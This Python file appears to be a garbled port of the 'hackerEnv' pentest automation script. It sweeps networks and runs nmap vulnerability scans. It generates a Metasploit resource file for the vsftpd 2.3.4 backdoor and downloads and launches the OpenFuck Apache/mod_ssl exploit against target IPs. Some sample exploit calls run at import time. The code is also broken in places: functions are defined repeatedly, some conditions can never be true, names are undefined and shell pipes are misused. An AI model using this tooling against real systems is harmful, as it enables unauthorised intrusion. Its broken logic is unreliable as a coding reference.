import subprocess
import os

VER = "0.1.6"
full_path = os.path.realpath(__file__)
dir_path = os.path.dirname(full_path)
BLUE = "\033[1;34m"
RED = "\033[1;91m"
GREEN = "\033[32m"
BOLD = "\033[1m"
resetStyle = "\033[0m"


def logo():
    print("\n")
    print(f"{RED}+ -- --=[hackerEnv v{VER} by @abdulr7mann")
    print(f"{RED}+ -- --=[https://hackerEnv.com{resetStyle}")
    print("")


def updateOptWithVerbose():
    print(f"+ -- --=[Checking for updates... ")
    try:
        noConnection = subprocess.check_output(
            ["curl", "-s", "https://api.github.com/repos/abdulr7mann/hackerEnv/tags"]
        )
    except subprocess.CalledProcessError:
        print(f"{RED}+ -- --=[Error: no active internet connection {resetStyle}")
        print("")
        exit(1)

    noConnection = noConnection.decode("utf-8")
    LATEST_VERSION = subprocess.check_output(
        [
            "curl",
            "-s",
            "https://api.github.com/repos/abdulr7mann/hackerEnv/tags",
            "|",
            "grep",
            "-Po",
            '"name":.*?[^\\\\]",\'',
            "|",
            "head",
            "-1",
            "|",
            "cut",
            "-c11-15",
        ]
    )
    LATEST_VERSION = LATEST_VERSION.decode("utf-8").strip()

    if LATEST_VERSION != VER and LATEST_VERSION != "":
        print(f"+ -- --=[hackerEnv v{LATEST_VERSION} is available to download.")
        answer = input("+ -- --=[Do you want to update hackerEnv [Y/n]: ")
        if answer.lower() in ["y", "yes"]:
            try:
                os.chdir(dir_path)
                subprocess.check_output(["git", "fetch"])
                subprocess.check_output(["git", "reset", "--hard"])
                subprocess.check_output(["git", "pull", "origin", "master"])
                subprocess.check_output(["git", "switch", "-c", "origin/master"])
                subprocess.check_output(["git", "checkout", "origin/master"])
                os.chmod(full_path, 0o755)
                os.chdir("-")
                print("")
                exit(1)
            except subprocess.CalledProcessError:
                print(f"{RED}+ -- --=[Couldn't download latest version {resetStyle}")
                print("")
                exit(1)
    else:
        print(f"+ -- --=[hackerEnv is already the latest version.")
        print("")


def valid_ip(ip):
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit() or int(part) > 255:
            return False
    return True


def cleaning():
    online_file = os.path.join(dir_path, "online.txt")
    urip_file = os.path.join(dir_path, "urIp.txt")
    if os.path.exists(online_file) and os.path.exists(urip_file):
        os.remove(online_file)
        os.remove(urip_file)

    exploits_dir = os.path.join(dir_path, "exploits")
    if not os.path.exists(exploits_dir):
        os.makedirs(os.path.join(exploits_dir, "smb"))
        os.makedirs(os.path.join(exploits_dir, "ssh"))
        os.makedirs(os.path.join(exploits_dir, "ftp"))
        os.makedirs(os.path.join(exploits_dir, "apache"))
        os.makedirs(os.path.join(exploits_dir, "telnet"))

    report_file = os.path.join(dir_path, "report.html")
    if not os.path.exists(report_file):
        open(report_file, "w").close()


def dependencies():
    def install_package(package_name):
        try:
            subprocess.check_output(["apt", "install", package_name, "-y"])
        except subprocess.CalledProcessError:
            pass

    install_package("gnome-terminal")
    install_package("pandoc")

    nmap_vulners_dir = "/usr/share/nmap/scripts/nmap-vulners"
    vulscan_dir = "/usr/share/nmap/scripts/vulscan"
    wordlist_path = "/usr/share/wordlists/rockyou.txt"

    if not os.path.exists(nmap_vulners_dir):
        subprocess.check_output(
            [
                "git",
                "clone",
                "https://github.com/vulnersCom/nmap-vulners.git",
                nmap_vulners_dir,
            ]
        )

    if not os.path.exists(vulscan_dir):
        subprocess.check_output(
            ["git", "clone", "https://github.com/scipag/vulscan.git", vulscan_dir]
        )

    if not os.path.exists(wordlist_path) and os.path.exists(
        "/usr/share/wordlists/rockyou.txt.gz"
    ):
        subprocess.check_output(
            [
                "wget",
                "-q",
                "-P",
                "/usr/share/wordlists/",
                "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
            ]
        )
    elif not os.path.exists(wordlist_path):
        subprocess.check_output(["gzip", "-d", "/usr/share/wordlists/rockyou.txt.gz"])


def terminals():
    def query(prompt):
        return input(prompt)

    def terminaltype():
        try:
            da = query("\033[>c")
            da = da[2:]
            parts = da.split(";")
            type_ = int(parts[0])
            vers = int(parts[1])
            rest = int(parts[2])
        except:
            type_, vers, rest = 0, 0, 0

        if type_ in [0, 1]:
            if type_ == 0:
                terminal = "VT100"
            else:
                terminal = "VT220"

            if type_ == 1 and vers >= 2000:
                terminal = "gnome-terminal"
        else:
            terminal = "unknown"

        return terminal

    terminal = terminaltype()

    if terminal == "tmux":
        subprocess.run(["tmux", "rename-session", "hackerEnv"])
        subprocess.run(["tmux", "rename-window", "-t", "0", "Pentesting"])

    print("\033[?1000l")


def vsftpd_234_backdoor(ips, product, version, ip):
    print(
        f"{BOLD}{ips}{resetStyle} has {BOLD}{product} {version}{resetStyle} which is {BOLD}vulnerable{resetStyle} to {RED}Backdoor command execution {resetStyle}"
    )
    print(
        f"{RED}Exploiting {resetStyle}{BOLD}{product} {version}{resetStyle} is in progress"
    )

    with open(
        os.path.join(dir_path, "exploits", "ftp", "vsftpd_234_backdoor.rc"), "w"
    ) as rc_file:
        rc_file.write(f"use exploit/unix/ftp/vsftpd_234_backdoor\n")
        rc_file.write(f"set RHOSTS {ips}\n")
        rc_file.write(f"set LHOST {ip}\n")
        rc_file.write(f"run\n")

    sleep(40)

    if terminal == "gnome-terminal":
        subprocess.run(
            [
                "gnome-terminal",
                "-q",
                "--tab",
                "-t",
                "vsftpdBackdoor",
                "--",
                "bash",
                "-c",
                f"msfconsole -r {os.path.join(dir_path, 'exploits', 'ftp', 'vsftpd_234_backdoor.rc')}; bash",
            ]
        )
    else:
        subprocess.run(
            [
                "tmux",
                "new-window",
                "-n",
                "vsftpdBackdoor",
                f"bash -c 'msfconsole -r {os.path.join(dir_path, 'exploits', 'ftp', 'vsftpd_234_backdoor.rc')}; read; bash'",
            ]
        )

    description = "A malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011."
    remediation = "It is recommended to update to the latest version."
    references = "https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html"
    body()


def ftpAnonymous(ips):
    print(
        f"{BLUE}Checking {resetStyle}if {BOLD}{ips}{resetStyle} is {BOLD}vulnerable{resetStyle} to {RED}ftp anonymous login {resetStyle}"
    )

    with open(
        os.path.join(dir_path, "exploits", "ftp", "ftpAnonymous.exp"), "w"
    ) as exp_file:
        exp_file.write(f"#!/usr/bin/expect -f\n")
        exp_file.write(f"spawn ftp {ips}\n")
        exp_file.write(f'expect ": "\n')
        exp_file.write(f'send "anonymous\\r"\n')
        exp_file.write(f'expect "Password:"\n')
        exp_file.write(f'send "\\r"\n')
        exp_file.write(f'expect "ftp>"\n')
        exp_file.write(f"interact\n")

    os.chmod(os.path.join(dir_path, "exploits", "ftp", "ftpAnonymous.exp"), 0o755)

    if terminal == "gnome-terminal":
        subprocess.run(
            [
                "gnome-terminal",
                "-q",
                "--tab",
                "-t",
                "ftpAnonymous",
                "--",
                "bash",
                "-c",
                f"expect {os.path.join(dir_path, 'exploits', 'ftp', 'ftpAnonymous.exp')}; bash",
            ]
        )
    else:
        subprocess.run(
            [
                "tmux",
                "new-window",
                "-n",
                "ftpAnonymous",
                f"bash -c 'expect {os.path.join(dir_path, 'exploits', 'ftp', 'ftpAnonymous.exp')}; read; bash'",
            ]
        )

    description = "The remote FTP server allows anonymous logins. Anonymous FTP allows users without accounts to have restricted access to certain directories on the system. The configuration of systems allowing anonymous FTP should be checked carefully, as improperly configured FTP servers are frequently attacked."
    remediation = "If you are not using this service, it is recommended to disable it or at least deny anonymous logins."
    references = "http://www.faqs.org/rfcs/rfc2577.html"
    body()


# Implement other functions for SSH and Telnet brute force, as well as other functionality...


def main():
    logo()
    updateOptWithVerbose()
    valid_ip("192.168.1.1")  # Sample usage of valid_ip function
    cleaning()
    dependencies()
    terminals()


if __name__ == "__main__":
    main()


# Helper function to check if the IP address is valid
def is_valid_ip(ip):
    parts = ip.split(".")
    return len(parts) == 4 and all(0 <= int(part) < 256 for part in parts)


# Function to perform IP sweep and check online hosts
def ip_sweep(ip):
    online_hosts = []
    for host in ip.splitlines():
        response = os.system(f"ping -c 1 {host} >/dev/null 2>&1")
        if response == 0:
            online_hosts.append(host)
            print(f"{host} is Online")
        else:
            print(f"{host} is Offline")
    return online_hosts


# Function to perform port scan
def port_scan(ip, aggressive=False):
    for host in ip:
        print(f"Performing port scan on {host}")
        if aggressive:
            subprocess.run(
                [
                    "nmap",
                    "-v0",
                    "-sT",
                    "-sU",
                    "-sV",
                    "-n",
                    "-Pn",
                    "-p-",
                    "-T4",
                    "-A",
                    "-O",
                    "--open",
                    "--script",
                    "nmap-vulners,vulscan",
                    f"--script-args",
                    "vulscandb=exploitdb.csv",
                    "-oA",
                    f"{host}/{host}",
                    host,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        else:
            subprocess.run(
                [
                    "nmap",
                    "-v0",
                    "-Pn",
                    "-n",
                    "-sV",
                    "-T4",
                    "-A",
                    "-O",
                    "-oA",
                    f"{host}/{host}",
                    host,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )


# Function to generate the report
def generate_report():
    # ... Add code to generate the report in HTML format ...
    pass


def main():
    logo = r"""
	_____	_	_   _   _____	____   __	 __ ______   _______ 
	|  __ \  | |  | | | | |_   _|  / __ \  \ \   / /|  ____| |__   __|
	| |__) | | |  | | | |   | |   | |  | |  \ \_/ / | |__	   | |   
	|  _  /  | |  | | | |   | |   | |  | |   \   /  |  __|	  | |   
	| | \ \  | |__| | | |  _| |_  | |__| |	| |   | |____	 | |   
	|_|  \_\  \____/  |_| |_____|  \____/	 |_|   |______|	|_|   
	"""
    print(logo)

    target = ""
    interface = ""
    attacker = ""
    sub_network = ""
    aggressive = False
    report_format = False

    while True:
        print(
            "[!] legal disclaimer: Usage of this script for attacking targets without prior mutual consent is illegal. "
            "It is the end user's responsibility to obey all applicable local, state, and federal laws. "
            "Developers assume no liability and are not responsible for any misuse or damage caused by this program."
        )

        print("Please select an option:")
        print("1. Scan the entire network.")
        print("2. Specify a target's IP.")
        print("3. Specify multiple targets' IPs.")
        print("4. Specify an interface.")
        print("5. Specify an attacker's IP.")
        print("6. Specify a subnet.")
        print("7. Enable aggressive port scan.")
        print("8. Generate the report.")
        print("9. Exit")

        choice = input("> ")

        if choice == "1":
            interface = input("Enter the interface name: ")
            sub_network = input("Enter the subnet (e.g., 24 or 23): ")
            ip = subprocess.getoutput(
                f"ifconfig {interface} | grep -oP 'inet \\K[^ ]+' | head -n 1"
            )
            online_hosts = ip_sweep(f"{ip}/{sub_network}")
            port_scan(online_hosts, aggressive)

        elif choice == "2":
            target = input("Enter the target's IP: ")
            if is_valid_ip(target):
                ip = target
                online_hosts = ip_sweep(ip)
                port_scan(online_hosts, aggressive)
            else:
                print("Invalid target IP.")

        elif choice == "3":
            targets = input("Enter multiple targets' IPs separated by newlines: ")
            ip = targets.strip()
            online_hosts = ip_sweep(ip)
            port_scan(online_hosts, aggressive)

        elif choice == "4":
            interface = input("Enter the interface name: ")
            ip = subprocess.getoutput(
                f"ifconfig {interface} | grep -oP 'inet \\K[^ ]+' | head -n 1"
            )
            online_hosts = ip_sweep(f"{ip}/24")
            port_scan(online_hosts, aggressive)

        elif choice == "5":
            attacker = input("Enter the attacker's IP: ")
            if is_valid_ip(attacker):
                aggressive = True
                print("Aggressive port scan enabled.")
            else:
                print("Invalid attacker IP.")

        elif choice == "6":
            sub_network = input("Enter the subnet (e.g., 24 or 23): ")
            ip = subprocess.getoutput("hostname -I")
            online_hosts = ip_sweep(f"{ip}/{sub_network}")
            port_scan(online_hosts, aggressive)

        elif choice == "7":
            aggressive = not aggressive
            if aggressive:
                print("Aggressive port scan enabled.")
            else:
                print("Aggressive port scan disabled.")

        elif choice == "8":
            report_format = True
            generate_report()
            print("Report generated.")

        elif choice == "9":
            print("Exiting.")
            break

        else:
            print("Invalid choice. Please try again.")


if __name__ == "__main__":
    main()


# Function to execute commands and get the output
def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()


ostype = run_command("uname -s").lower()
name = "ssh"
product = "OpenSSH"
version = run_command("ssh -V 2>&1 | awk '{print $1$2}'").lower()


def sshBruteForce():
    # Implementation of sshBruteForce function goes here
    # Replace this with your desired action for ssh brute force

    if (
        (ostype == "linux" or ostype == "windows")
        and name == "ssh"
        and product == "openssh"
    ):
        if version == "2.9p2" or version == "3.9p2" or version == "4.7p1":
            print("SSH")
        else:
            sshBruteForce()
    elif name == "ftp" and product == "vsftpd" and version == "2.3.4":
        # Implementation of vsftpd_234_backdoor function goes here
        # Replace this with your desired action for vsftpd_234_backdoor
        pass
    elif (
        name == "http"
        and product == "apache tomcat/coyote jsp engine"
        and version == "1.1"
    ):
        print(
            f"{ips} has {product} {version} which is vulnerable to remote code execution"
        )
        print("Exploiting {product} {version} is in progress")
        # Implementation of Apache Tomcat exploit goes here
        # Replace this with your desired action for Apache Tomcat vulnerability
        pass


#############	apache Debian  ####################################################################
def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()


name = "http"
product = "Apache httpd"
operatinS = run_command("uname -s").lower()
version = run_command("apache -v | grep 'version' | awk '{print $3}'").lower()


def body():
    # Implementation of body function goes here
    # Replace this with your desired action for body
    pass


def exploit_openfk(ips, version_code):
    print(f"{ips} has {product} {version} which is vulnerable to OpenF%&k")
    print(f"Exploiting {product} {version} is in progress")

    dir_path = os.getcwd()  # Replace this with the desired directory path
    openfk_path = f"{dir_path}/exploits/apache/OpenFuck"

    if not os.path.exists(openfk_path):
        os.makedirs(f"{dir_path}/exploits/{{smb,ssh,ftp,apache,telnet}}")
        os.system(
            f"wget -q -P {dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck"
        )

    if terminal == "gnome-terminal":
        os.system(
            f"gnome-terminal -q --tab -t 'openfk' -- bash -c '{openfk_path} {version_code} {ips} -c 41; read; bash' 2> /dev/null"
        )
    else:
        os.system(
            f"tmux new-window -n openfk 'bash -c \"{openfk_path} {version_code} {ips} -c 41; read; bash\"' \\; 2> /dev/null"
        )

    sleep_time = 10  # Adjust the sleep time as needed
    description = "The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session."
    remediation = "See references"
    references = "https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
    body()


if (
    name == "http"
    and product == "Apache httpd"
    and operatinS.startswith("apache/")
    and version == "1.3.9"
):
    exploit_openfk(ips, "0x0c")
elif (
    name == "http"
    and product == "Apache httpd"
    and operatinS.startswith("apache/")
    and version == "1.3.19"
):
    exploit_openfk(ips, "0x0d")
elif (
    name == "http"
    and product == "Apache httpd"
    and operatinS.startswith("apache/")
    and version == "1.3.22"
):
    exploit_openfk(ips, "0x0e")
elif (
    name == "http"
    and product == "Apache httpd"
    and operatinS.startswith("apache/")
    and version == "1.3.24"
):
    exploit_openfk(ips, "0x0f")
elif (
    name == "http"
    and product == "Apache httpd"
    and operatinS.startswith("apache/")
    and version == "1.3.26"
):
    exploit_openfk(ips, "0x10")
elif (
    name == "http"
    and product == "Apache httpd"
    and operatinS.startswith("apache/")
    and version == "1.3.27"
):
    exploit_openfk(ips, "0x11")


##########	apache RedHat  ####################################################################
def download_exploit_file(url, destination_path):
    if not os.path.exists(destination_path):
        response = requests.get(url)
        with open(destination_path, "wb") as file:
            file.write(response.content)


def exploit_http_vulnerability(ips, product, version, operatinS, terminal, dir_path):
    openfk_url = "https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck"
    openfk_path = os.path.join(dir_path, "exploits", "apache", "OpenFuck")
    if not os.path.exists(openfk_path):
        download_exploit_file(openfk_url, openfk_path)

    vulnerable_versions = [
        {"product": "Apache httpd", "version": "1.2.6", "operatinS": "1.3.23"},
        {"product": "Apache httpd", "version": "1.3.14", "operatinS": "1.3.22+1.46"},
        {"product": "Apache httpd", "version": "2.6.2", "operatinS": "2.8.7-1.3.23"},
        {"product": "Apache httpd", "version": "1.3.3", "operatinS": "1.3.22+1.46"},
    ]

    for vuln_info in vulnerable_versions:
        if (
            product == vuln_info["product"]
            and version == vuln_info["version"]
            and operatinS == vuln_info["operatinS"]
        ):
            print(f"{ips} has {product} {version} which is vulnerable to OpenF%&k")
            print(f"Exploiting {product} {version} is in progress")

            if terminal == "gnome-terminal":
                subprocess.run(
                    [
                        "gnome-terminal",
                        "-q",
                        "--tab",
                        "-t",
                        "openfk",
                        "--",
                        "bash",
                        "-c",
                        f"{openfk_path} 0x47 {ips} -c 41; read; bash",
                    ],
                    stderr=subprocess.DEVNULL,
                )
                sleep(10)
            else:
                subprocess.run(
                    [
                        "tmux",
                        "new-window",
                        "-n",
                        "openfk",
                        "--",
                        "bash",
                        "-c",
                        f"{openfk_path} 0x47 {ips} -c 41; read; bash",
                    ],
                    stderr=subprocess.DEVNULL,
                )
                sleep(10)

            description = "The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session."
            remediation = "See references"
            references = "https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"

            # Call the body function (assuming it is defined somewhere in your code)
            body()


if __name__ == "__main__":
    ips = "192.168.1.1"
    product = "Apache httpd"
    version = "1.2.6"
    operatinS = "1.3.23"
    terminal = "gnome-terminal"
    dir_path = "/path/to/your/dir"

    exploit_http_vulnerability(ips, product, version, operatinS, terminal, dir_path)


def execute_exploit(exploit_command):
    subprocess.run(exploit_command, shell=True)


def download_exploit_if_needed(dir_path):
    import os

    exploit_path = os.path.join(dir_path, "exploits", "apache", "OpenFuck")
    if not os.path.isfile(exploit_path):
        import urllib.request

        exploit_url = (
            "https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck"
        )
        urllib.request.urlretrieve(exploit_url, exploit_path)
        os.chmod(exploit_path, 0o755)


def exploit_apache(version, ips, terminal):
    dir_path = "/path/to/directory"  # Replace this with the actual directory path
    product = "Apache httpd"
    operatinS = "1.2.6"  # Replace this with the actual Apache version you are checking

    if version == "1.2.6" and product + "Openfk" == "Red-Hat/Linux":
        print(f"{ips} has {product} {version} which is vulnerable to OpenF%&k")
        print(f"Exploiting {product} {version} is in progress")

        download_exploit_if_needed(dir_path)

        if terminal == "gnome-terminal":
            exploit_command_1 = f"gnome-terminal -q --tab -t 'openfk' -- bash -c '{dir_path}/exploits/apache/OpenFuck 0x4a {ips} -c 41; read; bash' 2> /dev/null"
            exploit_command_2 = f"gnome-terminal -q --tab -t 'openfk' -- bash -c '{dir_path}/exploits/apache/OpenFuck 0x4b {ips} -c 41; read; bash' 2> /dev/null"

            execute_exploit(exploit_command_1)
            execute_exploit(exploit_command_2)
        else:
            exploit_command = f"tmux new-window -n openfk 'bash -c \"{dir_path}/exploits/apache/OpenFuck 0x4a {ips} -c 41; read; bash\"' ; 2> /dev/null"
            execute_exploit(exploit_command)

            exploit_command = f"tmux split-window -t openfk 'bash -c \"{dir_path}/exploits/apache/OpenFuck 0x4b {ips} -c 41; read; bash\"' ; 2> /dev/null"
            execute_exploit(exploit_command)

        sleep_duration = 10
        print(f"Waiting for {sleep_duration} seconds for the exploits to complete...")
        import time

        time.sleep(sleep_duration)

        description = "The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session."
        remediation = "See references"
        references = "https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
        # You can use 'description', 'remediation', and 'references' as needed for further processing.
        body()
    # Add other elif conditions for different versions of Apache if needed.


def body():
    # Implement the logic for the 'body' function if required.
    pass


# Sample usage:
version = "1.2.6"
ips = "192.168.1.100"
terminal = "gnome-terminal"
exploit_apache(version, ips, terminal)


def execute_command(command):
    subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def download_exploit(exploit_url, target_dir):
    execute_command(f"wget -q -P {target_dir} {exploit_url}")


def exploit_apache(ips, product, version, operatinS, terminal):
    dir_path = "/path/to/your/exploit/directory"  # Replace with the actual path

    if product == "Apache httpd" and "Apache/" + operatinS == version:
        if version == "Apache/1.2.6" and product + "Openfk" == "Red-Hat/Linux":
            print(f"{ips} has {product} {version} which is vulnerable to OpenF%&k")
            print("Exploiting {product} {version} is in progress")

            exploit_url = (
                "https://example.com/OpenF%&k"  # Replace with the actual exploit URL
            )
            if not os.path.isfile(os.path.join(dir_path, "OpenF%&k")):
                download_exploit(
                    exploit_url, os.path.join(dir_path, "exploits/apache/")
                )

            if terminal == "gnome-terminal":
                execute_command(
                    f"gnome-terminal -q --tab -t 'openfk' -- bash -c '{dir_path}/exploits/apache/OpenF%&k {ips} -c 41; read; bash' 2> /dev/null"
                )
                time.sleep(10)
            else:
                execute_command(
                    f"tmux new-window -n openfk 'bash -c \"{dir_path}/exploits/apache/OpenF%&k {ips} -c 41; read; bash\"' 2> /dev/null"
                )
                time.sleep(10)

            description = "The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46..."
            remediation = "See references"
            references = "https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
            body()


# Usage example
ips = "192.168.1.1"
product = "Apache httpd"
version = "Apache/1.2.6"
operatinS = "Apache"
terminal = "gnome-terminal"


def execute_command(command):
    subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def download_exploit(exploit_url, target_dir):
    execute_command(f"wget -q -P {target_dir} {exploit_url}")


def exploit_apache(ips, product, version, operating_system, terminal):
    dir_path = "/path/to/your/exploit/directory"  # Replace with the actual path

    if product == "Apache httpd" and f"Apache/{operating_system}" == version:
        if version == "Apache/1.3.19" and f"{product}Openfk" == "Red-Hat/Linux":
            print(f"{ips} has {product} {version} which is vulnerable to OpenF%&k")
            print(f"Exploiting {product} {version} is in progress")

            exploit_url = (
                "https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck"
            )
            if not os.path.isfile(os.path.join(dir_path, "OpenFuck")):
                download_exploit(
                    exploit_url, os.path.join(dir_path, "exploits/apache/")
                )

            if terminal == "gnome-terminal":
                execute_command(
                    f"gnome-terminal -q --tab -t 'openfk' -- bash -c '{dir_path}/exploits/apache/OpenFuck 0x64 {ips} -c 41; read; bash' 2> /dev/null"
                )
                execute_command(
                    f"gnome-terminal -q --tab -t 'openfk' -- bash -c '{dir_path}/exploits/apache/OpenFuck 0x65 {ips} -c 41; read; bash' 2> /dev/null"
                )
                time.sleep(10)
            else:
                execute_command(
                    f"tmux new-window -n openfk 'bash -c \"{dir_path}/exploits/apache/OpenFuck 0x64 {ips} -c 41; read; bash\"' 2> /dev/null"
                )
                execute_command(
                    f"tmux split-window -t openfk 'bash -c \"{dir_path}/exploits/apache/OpenFuck 0x65 {ips} -c 41; read; bash\"' 2> /dev/null"
                )
                time.sleep(10)

            description = "The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session."
            remediation = "See references"
            references = "https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
            body()


# Add similar functions for other exploit cases as shown in the Bash script

# Usage example
ips = "192.168.1.1"
product = "Apache httpd"
version = "Apache/1.3.19"
operating_system = "Apache"
terminal = "gnome-terminal"

exploit_apache(ips, product, version, operating_system, terminal)
